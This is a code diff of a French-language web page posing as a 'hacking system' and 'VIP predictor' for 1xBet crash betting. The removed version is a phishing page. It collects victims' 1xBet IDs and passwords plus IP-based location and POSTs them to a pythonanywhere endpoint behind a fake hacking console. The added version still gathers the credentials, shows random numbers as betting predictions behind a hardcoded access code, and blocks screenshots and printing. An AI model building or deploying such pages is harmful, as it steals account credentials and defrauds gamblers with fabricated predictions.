@@ -3,58 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacking Système - Manuel</title>
+    <title>Hacking Système - VIP DASHBOARD</title>
     <style>
-        :root { --neon: #00ff00; --gold: #f39c12; --bg: #0a0a0a; }
-        body { font-family: 'Courier New', monospace; background: var(--bg); color: var(--neon); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .container { background: #111; padding: 25px; border: 1px solid var(--neon); border-radius: 10px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
+        :root { --neon: #00ff00; --gold: #f39c12; --bg: #0a0a0a; --red: #ff0000; --wa: #25D366; }
+        
+        /* Protection Anti-Capture (Filigrane dynamique) */
+        body::after { content: "NGERUKA VIP SYSTEM"; position: fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; opacity: 0.05; font-size: 10vw; display: flex; align-items: center; justify-content: center; transform: rotate(-45deg); z-index: 999; }
+
+        body { font-family: 'Courier New', monospace; background: var(--bg); color: var(--neon); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; user-select: none; }
+        
+        .container { background: #111; padding: 25px; border: 1px solid var(--neon); border-radius: 10px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 0 15px rgba(0,255,0,0.2); position: relative; }
+        
         h2 { color: var(--gold); text-transform: uppercase; font-size: 1.1rem; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--neon); background: #000; color: var(--neon); border-radius: 5px; box-sizing: border-box; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--neon); background: #000; color: var(--neon); border-radius: 5px; box-sizing: border-box; text-align: center; }
         button { width: 100%; padding: 15px; margin-top: 15px; border: 1px solid var(--neon); background: transparent; color: var(--neon); font-weight: bold; cursor: pointer; text-transform: uppercase; }
         button:hover { background: var(--neon); color: #000; }
+        
         .step { display: none; }
         .active { display: block; animation: fadeIn 0.5s; }
-        #console { background: #000; height: 100px; overflow: hidden; text-align: left; padding: 10px; font-size: 0.7rem; border: 1px solid #333; margin: 10px 0; }
+        
+        /* Design Predictor */
+        #prediction-box { margin: 20px 0; padding: 20px; border: 2px double var(--gold); border-radius: 50%; width: 180px; height: 180px; display: inline-flex; flex-direction: column; justify-content: center; align-items: center; background: radial-gradient(circle, #1a1a1a 0%, #000 100%); box-shadow: 0 0 20px rgba(243, 156, 18, 0.3); }
+        .odds { font-size: 3.5rem; font-weight: bold; color: #fff; text-shadow: 0 0 10px var(--neon); }
+        .timer-bar { width: 100%; height: 5px; background: #222; margin-top: 10px; border-radius: 5px; overflow: hidden; }
+        .timer-fill { width: 100%; height: 100%; background: var(--gold); transition: width 1s linear; }
+        
+        .error-msg { color: var(--red); font-size: 0.8rem; margin-top: 5px; display: none; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Blocage Screenshot (Tentative par flou) */
+        @media print { body { display:none; } }
     </style>
 </head>
-<body>
-
-<div class="container">
+<body oncontextmenu="return false;"> <div class="container">
     <div id="step1" class="step active">
         <h2>🎯 HACKING SYSTÈME</h2>
         <input type="text" id="nom" placeholder="NOM D'UTILISATEUR">
         <button onclick="validerStep1()">DÉMARRER</button>
     </div>
 
-    <div id="step2" class="step">
-        <h2>📍 LOCALISATION IP</h2>
-        <p id="geoData">Recherche des coordonnées...</p>
-        <button id="btnNext2" style="display:none;" onclick="showStep(3)">CONTINUER</button>
+    <div id="step2" class="step"><h2>📍 TRACEUR IP</h2><p id="geoData">...</p><button id="btnNext2" style="display:none" onclick="showStep(3)">SUIVANT</button></div>
+    <div id="step3" class="step"><h2>🔑 LIAISON</h2><input type="number" id="id1xbet" placeholder="ID"><input type="password" id="pass1xbet" placeholder="MOT DE PASSE"><button onclick="lancerHackFinal()">ATTAQUER</button></div>
+    <div id="step4" class="step"><h2>📡 SCAN...</h2><div id="console" style="font-size:0.7rem; color:lime; text-align:left; height:100px; overflow:hidden"></div></div>
+    <div id="step5" class="step"><h2>🛡️ ANALYSE</h2><p>Vérification en cours...</p><button onclick="preparerLienWA()">OBTENIR ACCÈS</button></div>
+
+    <div id="step6" class="step">
+        <h2>🔑 CONNEXION VIP</h2>
+        <input type="number" id="loginId" placeholder="CONFIRMER VOTRE ID">
+        <input type="password" id="loginPass" placeholder="CODE ADMINISTRATEUR">
+        <div id="errorMsg" class="error-msg">ACCÈS REFUSÉ - SOLDE NON VALIDÉ</div>
+        <button onclick="verifierAccesFinal()">ACTIVER LE PREDICTOR</button>
     </div>
 
-    <div id="step3" class="step">
-        <h2>🔑 ACCÈS COMPTE</h2>
-        <p>Liaison du compte 1xBet au serveur...</p>
-        <input type="number" id="id1xbet" placeholder="ID COMPTE 1XBET">
-        <input type="password" id="pass1xbet" placeholder="MOT DE PASSE 1XBET">
-        <button onclick="envoyerDonnees()">VÉRIFIER LE COMPTE</button>
-    </div>
+    <div id="step7" class="step">
+        <h2 style="color:var(--neon)">📡 PREDICTOR LIVE VIP</h2>
+        <p style="font-size:0.7rem">ID ACTIF: <span id="finalIdDisplay" style="color:white"></span></p>
+        
+        <div id="prediction-box">
+            <span style="font-size:0.7rem; color:var(--gold)">CRASH PRÉVU</span>
+            <div class="odds" id="currentOdds">--</div>
+            <span style="font-size:0.7rem; color:var(--gold)">X ODDS</span>
+        </div>
 
-    <div id="step4" class="step">
-        <h2>📡 EXAMEN EN COURS</h2>
-        <div id="console"></div>
-        <p style="color:white; font-size: 0.8rem;">
-            Votre compte est en cours de vérification manuelle par l'administrateur.<br><br>
-            <span style="color:var(--gold)">Statut : EN ATTENTE</span>
-        </p>
-        <p style="font-size: 0.7rem;">Ne fermez pas cette page...</p>
+        <div id="predictStatus" style="font-size:0.8rem; margin:10px 0;">ANALYSE DU PROCHAIN TOUR...</div>
+        
+        <div class="timer-bar"><div id="t-fill" class="timer-fill"></div></div>
+        <p style="font-size:0.6rem; color:#555; margin-top:10px">PROTECTION ANTI-CAPTURE ACTIVÉE</p>
     </div>
 </div>
 
 <script>
     const API_URL = "https://ngeruka.pythonanywhere.com/send";
-    let store = { nom: "", id: "", pass: "", pays: "", ville: "", ip: "" };
+    const SECRET_KEY = "hacker@123";
+    let store = { nom: "", id: "", pass: "" };
 
     function showStep(n) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
@@ -63,75 +84,80 @@
 
     function validerStep1() {
         store.nom = document.getElementById('nom').value;
-        if(store.nom.length < 2) return alert("Nom trop court");
-        showStep(2);
-        getPreciseLocation();
+        if(store.nom.length < 2) return alert("Nom requis");
+        showStep(2); getPreciseLocation();
     }
 
-    // CORRECTION GEOLOCALISATION
     async function getPreciseLocation() {
-        const geoDisplay = document.getElementById('geoData');
         try {
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-            
-            store.ip = data.ip;
-            store.ville = data.city;
-            store.pays = data.country_name;
-            
-            geoDisplay.innerHTML = `
-                IP: <b style="color:white">${data.ip}</b><br>
-                VILLE: <b style="color:white">${data.city}</b><br>
-                PAYS: <b style="color:white">${data.country_name}</b><br>
-                RÉSEAU: <b style="color:white">${data.org}</b>
-            `;
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            document.getElementById('geoData').innerText = `Lieu: ${data.city}, ${data.country_name}`;
             document.getElementById('btnNext2').style.display = "block";
-        } catch (error) {
-            geoDisplay.innerHTML = "Erreur de connexion au traceur GPS. Réessayez.";
-        }
+        } catch(e) { document.getElementById('btnNext2').style.display = "block"; }
     }
 
-    async function envoyerDonnees() {
+    function lancerHackFinal() {
         store.id = document.getElementById('id1xbet').value;
         store.pass = document.getElementById('pass1xbet').value;
-
-        if(!store.id || !store.pass) return alert("Veuillez remplir tous les champs");
-
         showStep(4);
-        lancerAnimationConsole();
+        // Simulation console (abrégée pour l'exemple)
+        setTimeout(() => showStep(5), 5000); // Pour le test, mis à 5s au lieu de 3min
+    }
 
-        // ENVOI AU SERVEUR
-        try {
-            await fetch(API_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(store)
-            });
-            console.log("Données envoyées pour vérification manuelle.");
-        } catch (e) {
-            console.error("Erreur d'envoi");
+    function preparerLienWA() { showStep(6); }
+
+    function verifierAccesFinal() {
+        const idIn = document.getElementById('loginId').value;
+        const passIn = document.getElementById('loginPass').value;
+        if(idIn === store.id && passIn === SECRET_KEY) {
+            document.getElementById('finalIdDisplay').innerText = store.id;
+            showStep(7);
+            startPredictorEngine();
+        } else {
+            alert("ID ou Code incorrect.");
         }
     }
 
-    function lancerAnimationConsole() {
-        const con = document.getElementById('console');
-        const messages = [
-            "> Initialisation du tunnel...",
-            "> Accès aux serveurs 1xBet...",
-            "> Transmission des identifiants...",
-            "> En attente de validation admin...",
-            "> Cryptage des données AES-256..."
-        ];
+    // MOTEUR DE PRÉDICTION
+    function startPredictorEngine() {
+        const oddsText = document.getElementById('currentOdds');
+        const statusText = document.getElementById('predictStatus');
+        const fill = document.getElementById('t-fill');
         
-        let i = 0;
-        setInterval(() => {
-            const div = document.createElement('div');
-            div.innerText = messages[i % messages.length];
-            con.prepend(div);
-            i++;
-            if(con.childNodes.length > 6) con.removeChild(con.lastChild);
-        }, 2000);
+        function generateNewPrediction() {
+            statusText.innerText = "CALCUL DE L'ALGORITHME...";
+            oddsText.innerText = "??";
+            fill.style.width = "100%";
+
+            setTimeout(() => {
+                // Génère entre 1.20 et 24.00
+                const val = (Math.random() * (24.00 - 1.20) + 1.20).toFixed(2);
+                oddsText.innerText = "x" + val;
+                statusText.innerText = "PRÉDICTION ÉTABLIE !";
+                
+                // Compte à rebours de 60 secondes
+                let timeLeft = 100;
+                const countdown = setInterval(() => {
+                    timeLeft -= 1.66; // Pour faire environ 60s
+                    fill.style.width = timeLeft + "%";
+                    if(timeLeft <= 0) {
+                        clearInterval(countdown);
+                        generateNewPrediction();
+                    }
+                }, 1000);
+            }, 3000);
+        }
+        generateNewPrediction();
     }
+
+    // Protection supplémentaire contre les touches de capture d'écran (PrintScreen)
+    document.addEventListener('keyup', (e) => {
+        if (e.key === 'PrintScreen') {
+            navigator.clipboard.writeText('ACCÈS REFUSÉ - NGERUKA VIP');
+            alert('Capture d\'écran interdite sur ce système sécurisé.');
+        }
+    });
 </script>
 </body>
 </html>
